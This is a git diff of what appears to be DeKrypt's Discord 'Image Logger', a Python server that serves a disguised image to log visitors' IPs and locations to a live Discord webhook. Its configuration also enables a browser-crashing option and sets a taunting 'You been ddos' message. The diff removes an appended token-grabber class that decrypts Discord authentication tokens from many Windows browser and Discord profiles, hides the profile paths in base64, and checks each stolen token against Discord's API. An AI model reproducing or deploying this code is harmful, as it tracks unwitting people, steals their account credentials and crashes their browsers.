@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1336019986656792647/kFhWqpMf7bOgBW-ymb0KLC1kAFk2WiF_rajBcaDc0gQakaB559_1H0WJQLLy6vTxy0XQ",
-    "image": "https://www.bing.com/images/search?view=detailV2&ccid=escF%2fr0x&id=C9B9F5E4BD3BEED0A77044CF051E768204FF0D2C&thid=OIP.escF_r0xxbHdnM153PwyZAHaE7&mediaurl=https%3a%2f%2ffileinfo.com%2fimg%2fss%2fxl%2fjpg_44-2.jpg&cdnurl=https%3a%2f%2fth.bing.com%2fth%2fid%2fR.7ac705febd31c5b1dd9ccd79dcfc3264%3frik%3dLA3%252fBIJ2HgXPRA%26pid%3dImgRaw%26r%3d0&exph=1599&expw=2400&q=jpg&simid=608030644152635888&FORM=IRPRST&ck=648ADE92ABAD588E920D98BA8C2FB2AE&selectedIndex=1&itb=0.jpg", # You can also have a custom image by using a URL argument
+    "image": "data:image/jpeg;base64,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.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -24,11 +24,11 @@ config = {
     # OPTIONS #
     "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "You been ddos have nice day :)", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -301,128 +301,4 @@ if (!currenturl.includes("g=")) {
     do_GET = handleRequest
     do_POST = handleRequest
 
-handler = app = ImageLoggerAPI  import os
-import re
-import base64
-import json
-import requests
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import unpad
-from win32crypt import CryptUnprotectData
-
-class TokenGrabber:
-    @staticmethod
-    def object_to_dict(obj):
-        return json.loads(json.dumps(obj, default=lambda o: o.__dict__))
-
-    @staticmethod
-    def object_to_array(obj):
-        return json.loads(json.dumps(obj, default=lambda o: o.__dict__))
-
-    @staticmethod
-    def json_to_dict(json_str):
-        return json.loads(json_str)
-
-    @staticmethod
-    def dict_to_json(dictionary):
-        return json.dumps(dictionary)
-
-    @staticmethod
-    def grab_tokens(leveldb_path, localstate_path):
-        tokens = []
-        basic_regex = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
-        new_regex = re.compile(r'mfa\.[\w-]{84}')
-        encrypted_regex = re.compile(r'(dQw4w9WgXcQ:)([^.*\\[\'(.*)\'\\].*$][^\"]*)')
-
-        db_files = [os.path.join(root, file) for root, _, files in os.walk(leveldb_path) for file in files if file.endswith('.ldb')]
-        for file in db_files:
-            with open(file, 'r', encoding='utf-8', errors='ignore') as f:  # Ignore invalid characters
-                contents = f.read()
-
-            match1 = basic_regex.search(contents)
-            if match1:
-                tokens.append(match1.group())
-                print(f"Token found: {match1.group()}")  # Output the token to the console
-            match2 = new_regex.search(contents)
-            if match2:
-                tokens.append(match2.group())
-                print(f"Token found: {match2.group()}")  # Output the token to the console
-
-            match3 = encrypted_regex.search(contents)
-            if match3:
-                token = TokenGrabber.decrypt_token(base64.b64decode(match3.group().split("dQw4w9WgXcQ:")[1]), localstate_path)
-                tokens.append(token)
-                print(f"Decrypted token found: {token}")  # Output the decrypted token to the console
-
-        return tokens
-
-    @staticmethod
-    def decrypt_key(path):
-        with open(path, 'r', encoding='utf-8') as f:
-            deserialized_file = json.load(f)
-        encrypted_key = base64.b64decode(deserialized_file['os_crypt']['encrypted_key'])[5:]
-        return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-
-    @staticmethod
-    def decrypt_token(buffer, localstate_path):
-        encrypted_data = buffer[15:]
-        nonce = buffer[3:15]
-        cipher = AES.new(TokenGrabber.decrypt_key(localstate_path), AES.MODE_GCM, nonce=nonce)
-        decrypted_bytes = unpad(cipher.decrypt(encrypted_data), AES.block_size)
-        return decrypted_bytes.decode('utf-8').rstrip("\r\n\0")
-
-    @staticmethod
-    def grab():
-        pre_done = []
-        appdata = base64.b64decode("XEFwcERhdGE=").decode('utf-8')
-        user = os.path.expanduser("~")
-        locallevel = base64.b64decode("XExvY2FsIFN0b3JhZ2VcbGV2ZWxkYg==").decode('utf-8')
-        paths = [
-            "XFJvYW1pbmdcZGlzY29yZA==", "XFJvYW1pbmdcZGlzY29yZHB0Yg==", "XFJvYW1pbmdcZGlzY29yZGNhbmFyeQ==",
-            "XFJvYW1pbmdcZGlzY29yZGRldmVsb3BtZW50", "XFJvYW1pbmdcT3BlcmEgU29mdHdhcmVcT3BlcmEgU3RhYmxl",
-            "XFJvYW1pbmdcT3BlcmEgU29mdHdhcmVcT3BlcmEgR1ggU3RhYmxl", "XExvY2FsXEFtaWdvXFVzZXIgRGF0YQ==",
-            "XExvY2FsXFRvcmNoXFVzZXIgRGF0YQ==", "XExvY2FsXEtvbWV0YVxVc2VyIERhdGE=", "XExvY2FsXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHQ=",
-            "XExvY2FsXE9yYml0dW1cVXNlciBEYXRh", "XExvY2FsXENlbnRCcm93c2VyXFVzZXIgRGF0YQ==", "XExvY2FsXDdTdGFyXDdTdGFyXFVzZXIgRGF0YQ==",
-            "XExvY2FsXFNwdXRuaWtcU3B1dG5pa1xVc2VyIERhdGE=", "XExvY2FsXFZpdmFsZGlcVXNlciBEYXRhXERlZmF1bHQ=",
-            "XExvY2FsXEdvb2dsZVxDaHJvbWUgU3hTXFVzZXIgRGF0YQ==", "XExvY2FsXEVwaWMgUHJpdmFjeSBCcm93c2VyXFVzZXIgRGF0YQ==",
-            "XExvY2FsXHVDb3pNZWRpYVxVcmFuXFVzZXIgRGF0YVxEZWZhdWx0", "XExvY2FsXE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxEZWZhdWx0",
-            "XExvY2FsXFlhbmRleFxZYW5kZXhCcm93c2VyXFVzZXIgRGF0YVxEZWZhdWx0", "XExvY2FsXE9wZXJhIFNvZnR3YXJlXE9wZXJhIE5lb25cVXNlciBEYXRhXERlZmF1bHQ=",
-            "XExvY2FsXEJyYXZlU29mdHdhcmVcQnJhdmUtQnJvd3NlclxVc2VyIERhdGFcRGVmYXVsdA=="
-        ]
-        for i in paths:
-            localdb = user + appdata + base64.b64decode(i).decode('utf-8') + locallevel
-            localstate = user + appdata + base64.b64decode(i).decode('utf-8') + "\\Local State"
-            if "\\Default" in localstate:
-                localstate = localstate.replace("\\Default", "")
-            if os.path.exists(localdb) and os.path.exists(localstate):
-                pre_done.extend(TokenGrabber.grab_tokens(localdb, localstate))
-
-        pre_done = list(set(pre_done))
-        done = []
-        for i in pre_done:
-            try:
-                headers = {"authorization": i}
-                response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
-                done.append(f"{i}: {response.text}")
-            except:
-                pass
-
-        return done
-
-if __name__ == "__main__":
-    tokens = TokenGrabber.grab()  # Ensure grab is correctly called
-    print("Tokens and responses:")
-    for token in tokens:
-        print(token)
-
-
-
-
-
-
-
-
-
-
-
-
+handler = app = ImageLoggerAPI
